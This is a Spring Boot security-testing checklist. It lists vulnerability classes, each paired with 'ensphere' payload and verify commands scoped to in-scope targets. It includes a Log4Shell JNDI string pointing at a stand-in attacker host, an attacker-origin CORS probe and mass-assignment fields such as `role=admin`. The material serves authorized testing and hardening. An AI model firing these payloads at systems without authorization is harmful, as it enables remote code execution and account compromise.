# Spring Boot Security Checklist

Attack surface specific to Spring Boot and Spring Security applications.

## Actuator Exposure

- [ ] Actuator endpoints exposed without authentication — `/actuator/env`, `/actuator/beans`, `/actuator/heapdump`, `/actuator/configprops` leak secrets, class names, and memory dumps
  -> payloads: `ensphere payloads auth_bypass --technique forced_browsing`
  -> verify: `ensphere verify auth --technique no_token --url <target>/actuator/env --token <valid-jwt> --in-scope <pattern>`

## SpEL Injection

- [ ] Spring Expression Language injection — user input evaluated via `SpelExpressionParser` or `@Value("#{...}")` allows arbitrary code execution
  -> payloads: `ensphere payloads ssti --runtime jvm --technique expression_eval`
  -> verify: `ensphere verify ssti --url <endpoint> --param <param> --in-scope <pattern>`
  -> scan: `ensphere scan ./src --category ssti`

## Thymeleaf SSTI

- [ ] Thymeleaf server-side template injection — user input in template names or fragments (`__${user_input}__`) leads to RCE via Thymeleaf preprocessor
  -> payloads: `ensphere payloads ssti --runtime jvm --technique sandbox_escape`
  -> verify: `ensphere verify ssti --url <endpoint> --param <param> --in-scope <pattern>`

## Jackson Deserialization

- [ ] Jackson polymorphic deserialization — `@JsonTypeInfo` with `Id.CLASS` or `enableDefaultTyping()` allows instantiation of arbitrary classes from JSON input
  -> payloads: `ensphere payloads deserialization --runtime jvm --technique deserialization_rce`
  -> verify: `ensphere verify deserialization --technique dns_oob --url <endpoint> --param <param> --in-scope <pattern>`
  -> scan: `ensphere scan ./src --category deserialization`

## CORS Misconfiguration

- [ ] Overly permissive `@CrossOrigin` or `CorsConfiguration` — `allowedOrigins("*")` with `allowCredentials(true)` exposes authenticated endpoints to any origin
  -> payloads: manual — send request with `Origin: https://attacker.com` and check response CORS headers
  -> verify: `ensphere verify cors --url <endpoint> --in-scope <pattern>`

## CSRF Protection

- [ ] CSRF protection disabled — `http.csrf().disable()` in security config without stateless JWT justification; state-changing endpoints vulnerable to cross-site requests
  -> payloads: `ensphere payloads csrf --technique form_auto_submit`
  -> verify: `ensphere verify csrf --url <endpoint> --in-scope <pattern>`

## Security Headers

- [ ] Missing security headers — no `X-Content-Type-Options`, `X-Frame-Options`, `Strict-Transport-Security`, or `Content-Security-Policy` in Spring Security config
  -> payloads: manual — inspect response headers
  -> verify: `ensphere verify clickjacking --url <endpoint> --in-scope <pattern>`

## Auth Filter Chain Gaps

- [ ] Security filter chain ordering — `permitAll()` on paths that should be authenticated, or `antMatchers` pattern mismatch allowing bypass via trailing slash or case variation
  -> payloads: `ensphere payloads auth_bypass --technique forced_browsing`
  -> verify: `ensphere verify auth --technique no_token --url <endpoint> --token <valid-jwt> --in-scope <pattern>`

## Property Source Injection

- [ ] Externalized config injection — `spring.cloud.config.uri`, `spring.datasource.url`, or JNDI lookup strings controllable via environment variables or property files
  -> payloads: manual — check for `${}` placeholders in config resolved from user-facing inputs
  -> scan: `ensphere scan ./src --category cmdi`

## H2 Console Exposure

- [ ] H2 database console enabled in production — `spring.h2.console.enabled=true` exposes `/h2-console` with full SQL access and potential RCE via `CALL`
  -> payloads: `ensphere payloads sqli --technique union`
  -> verify: `ensphere verify auth --technique no_token --url <target>/h2-console --token <valid-jwt> --in-scope <pattern>`

## Log4Shell Patterns

- [ ] Log4j JNDI injection — logging user-controlled input with vulnerable Log4j versions (< 2.17.0) allows RCE via `${jndi:ldap://attacker/...}`
  -> payloads: `ensphere payloads ssrf --technique dns`
  -> verify: `ensphere verify ssrf --url <endpoint> --param <param> --in-scope <pattern>`
  -> scan: `ensphere scan ./src --category ssrf`

## Mass Assignment

- [ ] Mass assignment via `@ModelAttribute` — Spring MVC binds all request parameters to object fields; missing `@InitBinder` `setDisallowedFields` allows setting `role`, `admin`, etc.
  -> payloads: manual — POST with additional fields (`role=admin`, `active=true`) targeting `@ModelAttribute` endpoints
  -> verify: `ensphere verify authz --url <endpoint> --in-scope <pattern>`
